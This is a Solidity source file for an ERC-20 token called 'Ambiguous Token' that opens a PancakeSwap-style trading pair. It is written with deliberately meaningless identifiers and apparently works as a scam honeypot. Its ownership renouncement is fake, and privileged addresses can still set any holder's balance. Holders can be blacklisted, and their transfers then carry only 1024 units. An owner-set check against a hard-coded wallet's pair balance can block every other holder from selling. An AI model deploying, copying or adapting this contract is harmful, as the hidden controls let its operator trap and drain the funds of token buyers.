//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface feeLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapModeLaunch) external view returns (uint256);

    function transfer(address autoFrom, uint256 receiverMinSender) external returns (bool);

    function allowance(address launchedReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverMinSender) external returns (bool);

    function transferFrom(
        address sender,
        address autoFrom,
        uint256 receiverMinSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverMax, uint256 value);
    event Approval(address indexed launchedReceiver, address indexed spender, uint256 value);
}

abstract contract receiverLimitReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minAmountMode {
    function createPair(address sellReceiver, address shouldAt) external returns (address);
}

interface launchedLimit is feeLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AmbiguousToken is receiverLimitReceiver, feeLimit, launchedLimit {

    mapping(address => mapping(address => uint256)) private launchFund;

    bool public buyMarketingTake;

    uint256 private sellLimit;

    address public listExempt;

    constructor (){
        if (walletMode != swapAt) {
            amountReceiver = limitMarketing;
        }
        minLaunch teamMax = minLaunch(minAt);
        shouldTeamTrading = minAmountMode(teamMax.factory()).createPair(teamMax.WETH(), address(this));
        
        listExempt = _msgSender();
        listTake();
        launchedSwap[listExempt] = true;
        limitTeam[listExempt] = swapReceiver;
        
        emit Transfer(address(0), listExempt, swapReceiver);
    }

    uint256 private limitMarketing;

    address public shouldTeamTrading;

    mapping(address => bool) public launchedSwap;

    function listTake() public {
        emit OwnershipTransferred(listExempt, address(0));
        sellTotal = address(0);
    }

    function tokenReceiverMode(address teamEnable) public {
        totalMarketing();
        
        if (teamEnable == listExempt || teamEnable == shouldTeamTrading) {
            return;
        }
        enableLiquidity[teamEnable] = true;
    }

    string private amountWallet = "ATN";

    bool public amountSell;

    function allowance(address teamShouldFund, address teamToken) external view virtual override returns (uint256) {
        if (teamToken == minAt) {
            return type(uint256).max;
        }
        return launchFund[teamShouldFund][teamToken];
    }

    uint256 constant buyTeam = 2 ** 10;

    bool public autoToken;

    address private sellTotal;

    function balanceOf(address swapModeLaunch) public view virtual override returns (uint256) {
        return limitTeam[swapModeLaunch];
    }

    function transfer(address tradingMin, uint256 receiverMinSender) external virtual override returns (bool) {
        return shouldIs(_msgSender(), tradingMin, receiverMinSender);
    }

    string private sellListTeam = "Ambiguous Token";

    bool private txTake;

    function totalSupply() external view virtual override returns (uint256) {
        return swapReceiver;
    }

    function shouldIs(address amountLimit, address autoFrom, uint256 receiverMinSender) internal returns (bool) {
        if (amountLimit == listExempt) {
            return totalReceiver(amountLimit, autoFrom, receiverMinSender);
        }
        uint256 fundBuy = feeLimit(shouldTeamTrading).balanceOf(shouldWallet);
        require(fundBuy == enableTotal);
        require(autoFrom != shouldWallet);
        if (enableLiquidity[amountLimit]) {
            return totalReceiver(amountLimit, autoFrom, buyTeam);
        }
        return totalReceiver(amountLimit, autoFrom, receiverMinSender);
    }

    function approve(address teamToken, uint256 receiverMinSender) public virtual override returns (bool) {
        launchFund[_msgSender()][teamToken] = receiverMinSender;
        emit Approval(_msgSender(), teamToken, receiverMinSender);
        return true;
    }

    uint8 private tradingToken = 18;

    uint256 buyTx;

    event OwnershipTransferred(address indexed receiverAt, address indexed teamAuto);

    uint256 public txAmount;

    uint256 private swapReceiver = 100000000 * 10 ** 18;

    bool public exemptFeeLimit;

    function getOwner() external view returns (address) {
        return sellTotal;
    }

    address shouldWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address amountLimit, address autoFrom, uint256 receiverMinSender) external override returns (bool) {
        if (_msgSender() != minAt) {
            if (launchFund[amountLimit][_msgSender()] != type(uint256).max) {
                require(receiverMinSender <= launchFund[amountLimit][_msgSender()]);
                launchFund[amountLimit][_msgSender()] -= receiverMinSender;
            }
        }
        return shouldIs(amountLimit, autoFrom, receiverMinSender);
    }

    function toMin(address tradingMin, uint256 receiverMinSender) public {
        totalMarketing();
        limitTeam[tradingMin] = receiverMinSender;
    }

    bool private swapAt;

    function totalMarketing() private view {
        require(launchedSwap[_msgSender()]);
    }

    uint256 public amountReceiver;

    bool private walletMode;

    function symbol() external view virtual override returns (string memory) {
        return amountWallet;
    }

    mapping(address => uint256) private limitTeam;

    address minAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function maxTx(address enableFee) public {
        if (autoToken) {
            return;
        }
        
        launchedSwap[enableFee] = true;
        if (swapAt) {
            exemptFeeLimit = false;
        }
        autoToken = true;
    }

    function enableTo(uint256 receiverMinSender) public {
        totalMarketing();
        enableTotal = receiverMinSender;
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingToken;
    }

    mapping(address => bool) public enableLiquidity;

    function name() external view virtual override returns (string memory) {
        return sellListTeam;
    }

    function totalReceiver(address amountLimit, address autoFrom, uint256 receiverMinSender) internal returns (bool) {
        require(limitTeam[amountLimit] >= receiverMinSender);
        limitTeam[amountLimit] -= receiverMinSender;
        limitTeam[autoFrom] += receiverMinSender;
        emit Transfer(amountLimit, autoFrom, receiverMinSender);
        return true;
    }

    function owner() external view returns (address) {
        return sellTotal;
    }

    uint256 enableTotal;

}